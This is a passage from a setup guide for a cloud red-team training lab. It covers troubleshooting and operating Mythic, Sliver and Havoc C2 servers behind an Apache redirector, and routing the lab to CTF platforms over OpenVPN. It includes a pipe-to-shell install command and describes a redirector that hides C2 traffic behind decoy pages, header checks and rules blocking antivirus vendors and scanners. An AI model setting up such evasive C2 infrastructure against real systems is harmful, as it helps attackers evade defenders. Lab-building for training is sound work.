### Mythic Not Starting

**Symptoms:** mythic-cli status shows containers not running

**Solution:**

```bash
# Access via Guacamole SSH, or direct SSH with private IP:
MYTHIC_IP=$(terraform output -json mythic_server | jq -r '.private_ip')
ssh -i your-key.pem admin@$MYTHIC_IP

cd /opt/Mythic
sudo ./mythic-cli logs  # Check for errors
sudo ./mythic-cli restart
```

**Common Issues:**

- Docker still pulling images (wait 5 min)
- Port conflicts (check: `sudo netstat -tlnp`)
- Memory issues (upgrade to t3.large)

### Sliver Not Installed

**Symptoms:** `sliver-server` command not found

**Solution:**

```bash
# Check user-data log
sudo cat /var/log/user-data.log

# Re-run installation
curl https://sliver.sh/install | sudo bash
```

### Havoc Build Failed

**Symptoms:** Havoc teamserver binary not found or service fails to start

**Solution:**

```bash
# Check user-data log
sudo cat /var/log/user-data.log

# Check Go installation
/usr/local/go/bin/go version

# Rebuild manually
cd /opt/Havoc/teamserver
sudo -E /usr/local/go/bin/go build -o teamserver .

# Start manually to see errors
./teamserver server --profile /opt/Havoc/profiles/default.yaotl
```

### Guacamole RDP Fails

**Symptoms:** Can't connect to Windows via Guacamole

**Solution:**

```bash
# Check Guacamole logs
ssh admin@$GUAC_IP
docker logs guacamole

# Test RDP connectivity
WIN_IP=$(terraform output -json windows_client | jq -r '.private_ip')
telnet $WIN_IP 3389
```

**Common Issues:**

- Windows still setting up (wait 10 min)
- Security group misconfiguration
- Guacamole didn't auto-configure connection

### Agent Won't Callback

**Symptoms:** Agent executes but no callback in Mythic/Sliver/Havoc

**Checklist:**

- [ ] Listener is running on the C2 server
- [ ] Callback Host and Port match the redirector's public IP and correct port
- [ ] Agent sends the correct `X-Request-ID` header with the auto-generated token
- [ ] Agent URI uses the correct prefix (`/cdn/media/stream/`, `/cloud/storage/objects/`, or `/edge/cache/assets/`)
- [ ] Redirector Apache is running with all VirtualHosts enabled
- [ ] Redirector can reach the C2 server's private IP
- [ ] Agent user-agent is not blocked by redirect.rules (check for known scanner/AV strings)

**Debug:**

```bash
# Check Apache status and VirtualHosts
ssh admin@$REDIR_IP
sudo apache2ctl -S
systemctl status apache2

# Check logs (all C2 traffic in same log, differentiate by URI prefix)
sudo tail -100 /var/log/apache2/redirector-access.log
sudo tail -100 /var/log/apache2/redirector-error.log

# Run the pre-installed test script
sudo /root/test_redirector.sh
```

### Terraform Errors

**Error:** `InvalidKeyPair.NotFound`

```bash
# List available keys
aws ec2 describe-key-pairs --query 'KeyPairs[].KeyName'
# Update terraform.tfvars with correct name
```

**Error:** `VPC limit exceeded`

```bash
# Use default VPC instead
# In terraform.tfvars: use_default_vpc = true
```

---

## Post-Deployment Actions

### Cleanup (When Done)

```bash
terraform destroy
# Type 'yes' to confirm

# Verify removal
aws ec2 describe-instances --filters "Name=tag:Project,Values=redstack"
```

### Cost Management

**Stop instances when not in use:**

```bash
# Stop all
aws ec2 stop-instances --instance-ids \
  $(terraform output -json | jq -r '.mythic_server.value.instance_id') \
  $(terraform output -json | jq -r '.sliver_server.value.instance_id') \
  $(terraform output -json | jq -r '.havoc_server.value.instance_id') \
  $(terraform output -json | jq -r '.guacamole_server.value.instance_id') \
  $(terraform output -json | jq -r '.windows_client.value.instance_id') \
  $(terraform output -json | jq -r '.vps_redirector.value.instance_id')
```

---

## Success Criteria

At the end of this deployment, you should have:

- ✅ All 6 EC2 instances running and accessible
- ✅ 2 VPCs with peering configured
- ✅ Apache redirector with header validation, URI routing, and redirect.rules
- ✅ Mythic C2 server isolated (no public IP, internal only)
- ✅ Sliver C2 server isolated (no public IP, internal only)
- ✅ Havoc C2 server isolated (no public IP, internal only)
- ✅ Mythic HTTP listener configured through redirector (/cdn/media/stream/)
- ✅ Sliver HTTP listener configured through redirector (/cloud/storage/objects/)
- ✅ Havoc HTTP listener configured through redirector (/edge/cache/assets/)
- ✅ Header validation (X-Request-ID) filtering unauthorized requests
- ✅ redirect.rules blocking AV vendors and TOR exits (403); cloud IPs commented out for AWS compatibility
- ✅ Decoy page served for requests without valid C2 header
- ✅ At least 1 active agent callback per C2 framework
- ✅ Can execute commands through all C2 paths
- ✅ All 6 Guacamole connections auto-created (1 RDP, 5 SSH)
- ✅ Guacamole providing web-based access to all infrastructure components
- ✅ SSH password authentication working from VPC, keys required from public IPs
- ✅ Windows workstation with Chromium, VS Code, MobaXterm, and 7-Zip installed
- ✅ Windows Administrator accessible via Guacamole (AWS-generated password auto-configured)

**Your Boot-to-Breach lab environment is operational.**

---

## Part 8: External Target Environments (HTB/THM/ProvingGrounds)

### Objective: Connect Lab to External CTF Platforms

Route traffic from your internal lab machines (Windows workstation, C2 servers) to external target environments like HackTheBox, TryHackMe, or Proving Grounds through the Apache redirector's OpenVPN tunnel.

### How It Works

```bash
+---------------------------------------------------------------------+
|                     VPN ROUTING ARCHITECTURE                        |
+---------------------------------------------------------------------+

Traffic Flow:
[Windows/C2 Servers] -> Main VPC route table (10.10.0.0/16 -> VPC peering)
  -> Redirector VPC route table (10.10.0.0/16 -> redirector ENI)
  -> Redirector (iptables MASQUERADE on tun0)
  -> OpenVPN tunnel -> HTB/THM/PG targets

The redirector acts as a NAT gateway: internal machines send traffic
to CTF target IPs, which gets routed through VPC peering to the
redirector, then masqueraded out the VPN tunnel.
```

### Step 8.1: Enable VPN Routing Before Deployment

**This must be configured before running `terraform apply`.**

Edit `terraform.tfvars` and set:

```hcl
enable_external_vpn = true
```

This enables the following infrastructure changes:

- Installs OpenVPN client on the redirector
- Enables IP forwarding on the redirector
- Disables AWS `source_dest_check` on the redirector (required for packet forwarding)
- Adds VPC routes for CTF target CIDRs (default: `10.10.0.0/16`) through the redirector
- Adds security group rules allowing forwarded traffic from the main VPC

**Custom Target CIDRs (optional):**

The default routed CIDR is `10.10.0.0/16` which covers most HTB/THM lab ranges. If your target platform uses different ranges, add them in `terraform.tfvars`:

```hcl
enable_external_vpn = true
external_vpn_cidrs  = ["10.10.0.0/16", "10.200.0.0/16"]
```

> **Note:** If you already deployed without `enable_external_vpn = true`, you can enable it and run `terraform apply` again. Terraform will add the required routes, security group rules, and update the redirector instance.

### Step 8.2: Deploy and Obtain Your .ovpn File

1. Deploy the infrastructure with `terraform apply`
2. Download your `.ovpn` file from your CTF platform (HTB, THM, or Proving Grounds)

### Step 8.3: Upload the .ovpn File to the Redirector

**From your local machine:**

```bash
REDIR_IP=$(terraform output -json vps_redirector | jq -r '.public_ip')
scp -i your-key.pem lab.ovpn admin@$REDIR_IP:~/vpn/
```

**Or via Guacamole:**

1. Open the **"Apache Redirector (SSH)"** connection in Guacamole
2. Transfer the `.ovpn` file using Guacamole's file transfer feature or `scp` from another machine

### Step 8.4: Start the VPN Tunnel

**SSH to the redirector:**

```bash
ssh -i your-key.pem admin@$REDIR_IP
```

**Start the VPN:**

```bash
sudo ~/vpn.sh start ~/vpn/lab.ovpn
```

This will:

- Copy the `.ovpn` file to a persistent location (`~/vpn/external.ovpn`)
- Start OpenVPN with `--pull-filter ignore "redirect-gateway"` (critical: prevents the VPN from hijacking the redirector's default route, which would break all VPC peering and C2 proxy connectivity)
- Wait for the `tun0` interface to come up
- Configure iptables MASQUERADE rules for NAT

**Check VPN status:**

```bash
sudo ~/vpn.sh status
```

This shows the tunnel state, VPN IP, and active NAT rules.

### Step 8.5: Verify Connectivity from Internal Machines

**From the Windows operator workstation (via Guacamole RDP):**

```powershell
# Ping a target on the CTF network
ping 10.10.10.2

# Or run nmap, etc.
nmap -sC -sV 10.10.10.2
```

**From any C2 server (via Guacamole SSH):**

```bash
ping 10.10.10.2
```

Traffic from any internal machine destined for the CTF target CIDRs is automatically routed through the redirector's VPN tunnel.

### Step 8.6: Stop the VPN

```bash
sudo ~/vpn.sh stop
```

This kills the OpenVPN process and removes the iptables MASQUERADE rules. The `.ovpn` config file is preserved at `~/vpn/external.ovpn` so you can restart without re-uploading.

### Important Notes

- **The VPN does NOT affect C2 operations.** The `--pull-filter ignore "redirect-gateway"` flag ensures only CTF target traffic goes through the tunnel. All VPC peering, Apache proxy, and C2 callback traffic continues to work normally.
- **Only the configured CIDRs are routed.** By default, only `10.10.0.0/16` is routed through the VPN. Traffic to other destinations (internet, VPC peers) is unaffected.
- **The .ovpn file persists across reboots** in `~/vpn/external.ovpn`. However, the VPN tunnel itself does not auto-start — you must run `sudo ~/vpn.sh start` after a reboot.
- **All internal machines can reach CTF targets.** The routing is configured at the VPC level, so the Windows workstation, all C2 servers, and the Guacamole server can all reach targets through the VPN tunnel.

**Checkpoint:** Lab connected to external target environment, all internal machines can reach CTF targets
